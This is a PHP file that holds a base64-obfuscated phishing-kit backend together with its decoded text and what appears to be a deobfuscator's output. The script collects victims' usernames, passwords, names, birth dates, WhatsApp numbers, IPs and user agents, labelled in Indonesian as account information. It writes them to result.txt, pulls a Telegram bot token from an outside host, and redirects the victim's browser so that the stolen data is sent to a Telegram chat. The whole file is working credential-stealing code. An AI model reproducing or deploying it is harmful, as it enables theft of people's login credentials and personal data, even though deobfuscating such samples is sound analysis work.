<?php

$data = 'aWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICR1c2VyID0gJF9QT1NUWyd1c2VyJ107CiRwYXNzID0gJF9QT1NUWydwYXNzJ107CiRuaWNrID0gJF9QT1NUWyduaWNrJ107CiR0dGwgPSAkX1BPU1RbJ3R0bCddOwokcGhvbmUgPSAkX1BPU1RbJ3Bob25lJ107CiRpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOwokYWcgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzbXMgPSAiCklORk9STUFTSSBBS1VOCk5hbWE6ICAiLiAkbmljayAuIgpBa3VuOiAiLiAkdXNlciAuICIKU2FuZGk6ICIuICRwYXNzIC4iClRUTDogICIuICR0dGwgLiIKV2E6ICAiLiAkcGhvbmUgLiIKSXA6ICAiLiAkaXAgLiIKdXNlckFnZW46ICIuICRhZyAuIgoiOyAgIAogICRmaWxlID0gZm9wZW4oInJlc3VsdC50eHQiLCAiYSIpOwogIGZ3cml0ZSgkZmlsZSwgJHNtcyk7CiAgZmNsb3NlKCRmaWxlKTsKCiAgZWNobyAiRGF0YSBiZXJoYXNpbCBkaXNpbXBhbi4iOwp9IGVsc2UgewogIGVjaG8gIk1ldG9kZSByZXF1ZXN0IHRpZGFrIHZhbGlkLiI7Cn0KJGlkID0gaW5jbHVkZSgidXNlci5waHAiKTsKJGJvdCA9ICJodHRwOi8vYWJjLWFwaS5yZi5nZC8xLnBocCI7CiRjaCA9IGN1cmxfaW5pdCgpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkYm90KTsKY3VybF9zZXRvcHQoJGNoLCAKQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOwpjdXJsX2Nsb3NlKCRjaCk7CgokWVogPSAoJHJlc3BvbnNlKTsKCiR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCRZWi9zZW5kTWVzc2FnZT9jaGF0X2lkPSRpZCZ0ZXh0PSIudXJsZW5jb2RlKCRzbXMpOwoKaGVhZGVyKCJMb2NhdGlvbjogIiAuICR1cmwpOw==';
$decode = "if (\$_SERVER['REQUEST_METHOD'] === 'POST') {\n \$user = \$_POST['user'];\n\$pass = \$_POST['pass'];\n\$nick = \$_POST['nick'];\n\$ttl = \$_POST['ttl'];\n\$phone = \$_POST['phone'];\n\$ip = \$_SERVER['REMOTE_ADDR'];\n\$ag = \$_SERVER['HTTP_USER_AGENT'];\n\$sms = \"\nINFORMASI AKUN\nNama:  \". \$nick .\"\nAkun: \". \$user . \"\nSandi: \". \$pass .\"\nTTL:  \". \$ttl .\"\nWa:  \". \$phone .\"\nIp:  \". \$ip .\"\nuserAgen: \". \$ag .\"\n\";   \n  \$file = fopen(\"result.txt\", \"a\");\n  fwrite(\$file, \$sms);\n  fclose(\$file);\n\n  echo \"Data berhasil disimpan.\";\n} else {\n  echo \"Metode request tidak valid.\";\n}\n\$id = include(\"user.php\");\n\$bot = \"http://abc-api.rf.gd/1.php\";\n\$ch = curl_init();\ncurl_setopt(\$ch, CURLOPT_URL, \$bot);\ncurl_setopt(\$ch, \nCURLOPT_RETURNTRANSFER, true);\n\$response = curl_exec(\$ch);\ncurl_close(\$ch);\n\n\$YZ = (\$response);\n\n\$url = \"https://api.telegram.org/bot\$YZ/sendMessage?chat_id=\$id&text=\".urlencode(\$sms);\n\nheader(\"Location: \" . \$url);";
/* #1: PHPDeobfuscator eval output */ 
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $nick = $_POST['nick'];
        $ttl = $_POST['ttl'];
        $phone = $_POST['phone'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $ag = $_SERVER['HTTP_USER_AGENT'];
        $sms = "\nINFORMASI AKUN\nNama:  " . $nick . "\nAkun: " . $user . "\nSandi: " . $pass . "\nTTL:  " . $ttl . "\nWa:  " . $phone . "\nIp:  " . $ip . "\nuserAgen: " . $ag . "\n";
        $file = fopen("result.txt", "a");
        fwrite($file, $sms);
        fclose($file);
        echo "Data berhasil disimpan.";
    } else {
        echo "Metode request tidak valid.";
    }
    $id = (include "user.php");
    $bot = "http://abc-api.rf.gd/1.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $bot);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $YZ = $response;
    $url = "https://api.telegram.org/bot{$YZ}/sendMessage?chat_id={$id}&text=" . urlencode($sms);
    header("Location: " . $url);
/* END:#1 */
